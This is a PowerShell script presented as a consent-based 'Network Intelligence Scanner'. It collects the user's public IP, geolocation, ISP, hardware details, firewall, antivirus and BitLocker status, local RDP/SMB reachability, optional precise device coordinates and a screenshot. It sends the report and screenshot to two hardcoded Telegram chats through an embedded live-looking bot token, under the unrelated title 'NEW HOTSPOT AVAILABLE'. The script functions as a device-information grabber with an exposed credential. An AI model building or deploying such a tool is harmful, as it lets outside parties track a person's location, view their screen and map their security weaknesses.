#requires -Version 5.1
# Network Intelligence Scanner v3.0 - consent-based diagnostics
# One file. Do not publish a real bot token to a public GitHub repository.
$ErrorActionPreference = 'Stop'
$botToken = '8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk'
$chatIds = @('8640543929','8362186234')
$reportTitle = 'NEW HOTSPOT AVAILABLE'
$root = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'NetworkScannerReports'
New-Item -ItemType Directory -Path $root -Force | Out-Null
$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$na = 'Not Available'
$report = [ordered]@{}
$notes = New-Object System.Collections.Generic.List[string]
function Ask([string]$question) { ((Read-Host "$question [YES/NO]").Trim() -ieq 'YES') }
function Set-R([string]$name, $value) {
    if ($null -eq $value -or [string]::IsNullOrWhiteSpace([string]$value)) { $report[$name] = 'Not Available' }
    else { $report[$name] = [string]$value }
}
function Try-Measure([string]$label, [scriptblock]$action) {
    try { & $action } catch { $notes.Add("$label : $($_.Exception.Message)"); Write-Host "[$label] Not Available" -ForegroundColor DarkYellow }
}
function Api([string]$url) { Invoke-RestMethod -Uri $url -TimeoutSec 7 -ErrorAction Stop }
function Html($v) { [System.Net.WebUtility]::HtmlEncode([string]$v) }
function Probe([string]$hostName, [int]$port) {
    $tcp = New-Object System.Net.Sockets.TcpClient
    try {
        $ar=$tcp.BeginConnect($hostName,$port,$null,$null)
        if (-not $ar.AsyncWaitHandle.WaitOne(1300)) { return 'Unavailable / filtered' }
        $tcp.EndConnect($ar); 'Reachable'
    } catch { 'Unavailable / filtered' } finally { $tcp.Dispose() }
}
Write-Host 'Network Intelligence Scanner v3.0' -ForegroundColor Cyan
Write-Host 'Diagnostic information is collected locally. Telegram transfer requires confirmation.'
Set-R 'Scan time' (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
# Public addresses, individually best-effort; IPv6 is not guaranteed.
Try-Measure 'IPv4' { Set-R 'Public IPv4' (Api 'https://api.ipify.org?format=json').ip }
Try-Measure 'IPv6' { Set-R 'Public IPv6' (Api 'https://api6.ipify.org?format=json').ip }
$ip=$report['Public IPv4']
if ($ip -and $ip -ne $na) {
  Try-Measure 'IP geolocation' {
    $g=Api "https://ipapi.co/$ip/json/"
    if ($g.error) { throw 'Provider did not return a usable result' }
    Set-R 'Country (IP estimate)' $g.country_name; Set-R 'Region (IP estimate)' $g.region
    Set-R 'City (IP estimate)' $g.city; Set-R 'IP timezone' $g.timezone
    Set-R 'ISP / organization' $g.org; Set-R 'ASN' $g.asn
  }
  Try-Measure 'Proxy / VPN reputation' {
    $p=Api "https://proxycheck.io/v2/${ip}?vpn=1"
    $entry=$p.PSObject.Properties[$ip]
    if (-not $entry) { throw 'No matching IP result' }
    Set-R 'Proxy/VPN suspicion' $entry.Value.proxy
    Set-R 'Detection category' $entry.Value.type
    $notes.Add('Proxy/VPN result is heuristic, not proof. Tor cannot be reliably excluded by this check.')
  }
}
Set-R 'Tor detection' 'Not Available (requires verified exit-node dataset)'
# Network adapters, DNS, active connection, local addresses
Try-Measure 'Local network' {
  $n=Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway } | Select-Object -First 1
  if (-not $n) { throw 'No default IPv4 network adapter' }
  Set-R 'Adapter' $n.InterfaceAlias
  Set-R 'Local IPv4' (($n.IPv4Address | ForEach-Object IPAddress) -join ', ')
  Set-R 'Gateway' (($n.IPv4DefaultGateway | ForEach-Object NextHop) -join ', ')
  Set-R 'Configured DNS' (($n.DNSServer.ServerAddresses) -join ', ')
  $adapter=Get-NetAdapter -InterfaceIndex $n.InterfaceIndex -ErrorAction SilentlyContinue
  if ($adapter) { Set-R 'Link speed' $adapter.LinkSpeed; Set-R 'Interface type' $adapter.InterfaceDescription }
}
Try-Measure 'DNS resolution' {
  $sw=[Diagnostics.Stopwatch]::StartNew()
  $addresses=[Net.Dns]::GetHostAddresses('example.com')
  $sw.Stop()
  Set-R 'DNS resolve example.com' ("{0} ms; {1} records" -f $sw.ElapsedMilliseconds, $addresses.Count)
}
Set-R 'DNS leak test' 'Not Available (requires independent resolver-observation service)'
Set-R 'WebRTC leak test' 'Not Available (requires browser WebRTC test)'
Try-Measure 'Ping' {
  $pings=@(Test-Connection -ComputerName '1.1.1.1' -Count 4 -ErrorAction SilentlyContinue)
  if ($pings.Count -eq 0) { throw 'No ICMP responses (ICMP might be blocked)' }
  $rtt=@($pings | ForEach-Object { [double]$_.ResponseTime })
  $avg=($rtt | Measure-Object -Average).Average
  $variance=(($rtt | ForEach-Object { [math]::Pow(($_-$avg),2) } | Measure-Object -Average).Average)
  Set-R 'Ping / jitter estimate' ('{0:N1} ms mean / {1:N1} ms std.dev.' -f $avg,[math]::Sqrt($variance))
  Set-R 'ICMP packet loss' ('{0}%' -f ([math]::Round(100*(4-$pings.Count)/4)))
}
# Wi-Fi: locale dependent netsh output, only retain values if keywords match.
Try-Measure 'Wi-Fi' {
  $w=netsh wlan show interfaces 2>$null | Out-String
  if ($LASTEXITCODE -ne 0 -or -not $w.Trim()) { throw 'Wi-Fi interface unavailable' }
  foreach ($pair in @(@('Signal','Wi-Fi signal'),@('Channel','Wi-Fi channel'),@('Radio type','Wi-Fi standard'))) {
    if ($w -match "(?im)^\s*$([regex]::Escape($pair[0]))\s*:\s*(.+)$") { Set-R $pair[1] $Matches[1].Trim() }
  }
  if (-not $report['Wi-Fi signal']) { Set-R 'Wi-Fi signal' $na }
  if (-not $report['Wi-Fi channel']) { Set-R 'Wi-Fi channel' $na }
}
Set-R 'Wi-Fi channel congestion' 'Not Available (requires multi-network measurement)'
# Windows, hardware
Try-Measure 'Windows / hardware' {
  $os=Get-CimInstance Win32_OperatingSystem
  $cpu=Get-CimInstance Win32_Processor | Select-Object -First 1
  $cs=Get-CimInstance Win32_ComputerSystem
  Set-R 'Windows' ("$($os.Caption) build $($os.BuildNumber)")
  Set-R 'System uptime' ('{0:N1} hours' -f ((Get-Date)-$os.LastBootUpTime).TotalHours)
  Set-R 'System model' ("$($cs.Manufacturer) $($cs.Model)")
  Set-R 'CPU' ("$($cpu.Name); $($cpu.NumberOfCores) cores / $($cpu.NumberOfLogicalProcessors) threads")
  Set-R 'Installed RAM' ('{0:N1} GiB' -f ($cs.TotalPhysicalMemory/1GB))
  Set-R 'RAM usage at scan' ('{0:N0}%' -f (100*(1-$os.FreePhysicalMemory*1KB/$cs.TotalPhysicalMemory)))
  Set-R 'CPU load snapshot' ("$($cpu.LoadPercentage)%")
}
Try-Measure 'Graphics' {
  $gpu=Get-CimInstance Win32_VideoController | Where-Object Name | Select-Object -ExpandProperty Name -Unique
  Set-R 'GPU' ($gpu -join ', ')
}
Try-Measure 'Storage health' {
  $d=Get-PhysicalDisk -ErrorAction Stop | Select-Object FriendlyName,HealthStatus,MediaType,Size
  Set-R 'Storage devices / health' (($d | ForEach-Object { '{0} [{1}] {2} {3:N0} GB' -f $_.FriendlyName,$_.MediaType,$_.HealthStatus,($_.Size/1GB) }) -join '; ')
  $vol=Get-Volume | Where-Object { $_.DriveLetter -and $_.Size } | Select-Object -First 8
  Set-R 'Free disk space' (($vol | ForEach-Object { '{0}: {1:N1} GiB free' -f $_.DriveLetter,($_.SizeRemaining/1GB) }) -join '; ')
}
Set-R 'SMART wear / SSD temperature' 'Not Available (vendor-specific tools often required)'
Try-Measure 'Battery' {
  $b=Get-CimInstance Win32_Battery -ErrorAction Stop | Select-Object -First 1
  if (-not $b) { throw 'No battery reported' }
  Set-R 'Battery charge' ("$($b.EstimatedChargeRemaining)%")
  Set-R 'Battery status code' $b.BatteryStatus
}
Set-R 'Battery health/cycles' 'Not Available (requires supported battery telemetry)'
Try-Measure 'Display' {
  Add-Type -AssemblyName System.Windows.Forms
  $screens=@([Windows.Forms.Screen]::AllScreens)
  Set-R 'Displays' (($screens | ForEach-Object { '{0}x{1}' -f $_.Bounds.Width,$_.Bounds.Height }) -join ', ')
}
Set-R 'CPU / GPU temperatures' 'Not Available (sensor API or hardware monitor required)'
# Security and local services; measured without invasive scans
$securityChecks=@()
Try-Measure 'Firewall' {
  $fw=@(Get-NetFirewallProfile -ErrorAction Stop)
  $enabled=($fw | Where-Object Enabled).Count
  Set-R 'Windows Firewall' "$enabled/$($fw.Count) profiles enabled"
  $script:securityChecks+=($enabled -eq $fw.Count)
}
Try-Measure 'Defender' {
  $mp=Get-MpComputerStatus -ErrorAction Stop
  Set-R 'Defender antivirus' $(if ($mp.AntivirusEnabled) {'Enabled'} else {'Disabled'})
  $script:securityChecks+= [bool]$mp.AntivirusEnabled
}
Try-Measure 'Secure Boot' {
  $sb=Confirm-SecureBootUEFI -ErrorAction Stop
  Set-R 'Secure Boot' $sb
  $script:securityChecks+= [bool]$sb
}
Try-Measure 'BitLocker' {
  $bl=Get-BitLockerVolume -MountPoint $env:SystemDrive -ErrorAction Stop
  Set-R 'System drive BitLocker' $bl.ProtectionStatus
  $script:securityChecks+=($bl.ProtectionStatus -eq 'On')
}
if ($securityChecks.Count -gt 0) {
  $passed=@($securityChecks | Where-Object { $_ }).Count
  Set-R 'Security checks passed' "$passed/$($securityChecks.Count) (partial, not an official security score)"
}
foreach ($port in @(3389,445)) { Set-R "Local TCP $port (localhost)" (Probe '127.0.0.1' $port) }
Try-Measure 'Recent system errors' {
  $events=@(Get-WinEvent -FilterHashtable @{LogName='System';StartTime=(Get-Date).AddHours(-24);Level=1,2} -MaxEvents 250 -ErrorAction Stop)
  Set-R 'System critical/errors in 24h' $events.Count
  if ($events.Count -eq 250) { $notes.Add('Event count is capped at 250.') }
}
Try-Measure 'Power plan' {
  $p=powercfg /GETACTIVESCHEME | Out-String
  if ($LASTEXITCODE -ne 0) { throw 'Power plan unavailable' }
  Set-R 'Active power plan' $p.Trim()
}
Set-R 'Wattage / precise energy use' 'Not Available (requires dedicated sensors)'
Set-R 'Bottleneck analysis' 'Not Available (a reliable result requires repeated workload samples)'
# Exact device location is optional and only attempted after prior approval.
if (Ask 'Request device location from Windows? This may reveal precise coordinates') {
  Try-Measure 'Device location' {
    Add-Type -AssemblyName System.Device
    $watcher=New-Object System.Device.Location.GeoCoordinateWatcher([System.Device.Location.GeoPositionAccuracy]::Default)
    $started=$watcher.TryStart($false,[TimeSpan]::FromSeconds(5))
    if (-not $started -or $watcher.Position.Location.IsUnknown) { throw 'Location unavailable or permission denied' }
    $loc=$watcher.Position.Location
    Set-R 'Device coordinates (sensitive)' ('{0:F5}, {1:F5}' -f $loc.Latitude,$loc.Longitude)
    Set-R 'Device location precision (m)' $loc.HorizontalAccuracy
    $watcher.Stop()
  }
} else { Set-R 'Device coordinates (sensitive)' 'Not collected' }
# Screenshot - consent before capture, preview and separate consent before transfer.
$screenshot=$null
if (Ask 'Take a screenshot of the primary display?') {
  Try-Measure 'Screenshot' {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $bounds=[Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp=New-Object Drawing.Bitmap($bounds.Width,$bounds.Height)
    $gfx=[Drawing.Graphics]::FromImage($bmp)
    try { $gfx.CopyFromScreen($bounds.Location,[Drawing.Point]::Empty,$bounds.Size)
      $script:screenshot=Join-Path $root "screenshot_$stamp.png"
      $bmp.Save($screenshot,[Drawing.Imaging.ImageFormat]::Png)
    } finally { $gfx.Dispose();$bmp.Dispose() }
    Start-Process $screenshot
    Write-Host "Screenshot for review: $screenshot"
  }
}
# Save local reports
$report['Measurement notes']=($notes -join ' | ')
$jsonFile=Join-Path $root "scan_$stamp.json"
$htmlFile=Join-Path $root "scan_$stamp.html"
$report | ConvertTo-Json -Depth 6 | Set-Content -Path $jsonFile -Encoding UTF8
$rows=@(foreach($key in $report.Keys){'<tr><th>{0}</th><td>{1}</td></tr>' -f (Html $key),(Html $report[$key])})
$doc='<!doctype html><html><head><meta charset="utf-8"><title>Network Scanner</title><style>body{background:#111827;color:#e5e7eb;font:15px Segoe UI,Arial;padding:28px}table{border-collapse:collapse;width:100%}td,th{border:1px solid #374151;padding:9px;text-align:left}th{width:35%;color:#93c5fd}tr:nth-child(even){background:#1f2937}</style></head><body><h1>Network Scanner v3.0</h1><table>'+($rows -join "`n")+'</table></body></html>'
$doc | Set-Content -Path $htmlFile -Encoding UTF8
Write-Host "`n====== REPORT PREVIEW ======" -ForegroundColor Cyan
foreach($key in $report.Keys){ Write-Host ('{0}: {1}' -f $key,$report[$key]) }
Write-Host "`nJSON: $jsonFile`nHTML: $htmlFile"
# Telegram: no silent exfiltration. Explicit separate approval for network data and screenshot.
if (Ask 'Send the displayed network and device report to BOTH configured Telegram chats?') {
  if ($botToken -eq 'PASTE_NEW_BOT_TOKEN_HERE' -or -not $botToken) { Write-Warning 'Set the bot token first.' }
  else {
    $lines=@(foreach($key in $report.Keys){ '<b>{0}:</b> {1}' -f (Html $key),(Html $report[$key]) })
    $message='<b>'+(Html $reportTitle)+'</b>'+"`n`n"+($lines -join "`n")
    if ($message.Length -gt 4000) { $message=$message.Substring(0,3900)+"`n(Report truncated; full HTML/JSON saved locally)" }
    foreach($chatId in $chatIds) {
      try {
        Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Body @{chat_id=$chatId;text=$message;parse_mode='HTML'} -TimeoutSec 15 -ErrorAction Stop | Out-Null
        Write-Host "Report sent to $chatId"
      } catch { Write-Warning "Telegram report to ${chatId}: $($_.Exception.Message)" }
    }
  }
}
if ($screenshot -and (Test-Path $screenshot) -and (Ask 'Send the reviewed screenshot to BOTH Telegram chats?')) {
  if ($botToken -eq 'PASTE_NEW_BOT_TOKEN_HERE' -or -not $botToken) { Write-Warning 'Set the bot token first.' }
  else {
    Try-Measure 'Telegram photo' {
      Add-Type -AssemblyName System.Net.Http
      foreach($chatId in $chatIds){
        $client=[Net.Http.HttpClient]::new();$form=[Net.Http.MultipartFormDataContent]::new()
        try {
          $form.Add([Net.Http.StringContent]::new([string]$chatId),'chat_id')
          $photo=[Net.Http.ByteArrayContent]::new([IO.File]::ReadAllBytes($screenshot))
          $photo.Headers.ContentType=[Net.Http.Headers.MediaTypeHeaderValue]::Parse('image/png')
          $form.Add($photo,'photo','screenshot.png')
          $response=$client.PostAsync("https://api.telegram.org/bot$botToken/sendPhoto",$form).GetAwaiter().GetResult()
          $response.EnsureSuccessStatusCode() | Out-Null
          Write-Host "Screenshot sent to $chatId"
        } catch { Write-Warning "Photo to ${chatId}: $($_.Exception.Message)" }
        finally { $form.Dispose();$client.Dispose() }
      }
    }
  }
}
Write-Host "Complete. Local reports: $root" -ForegroundColor Green
Read-Host 'Press Enter to exit' | Out-Null
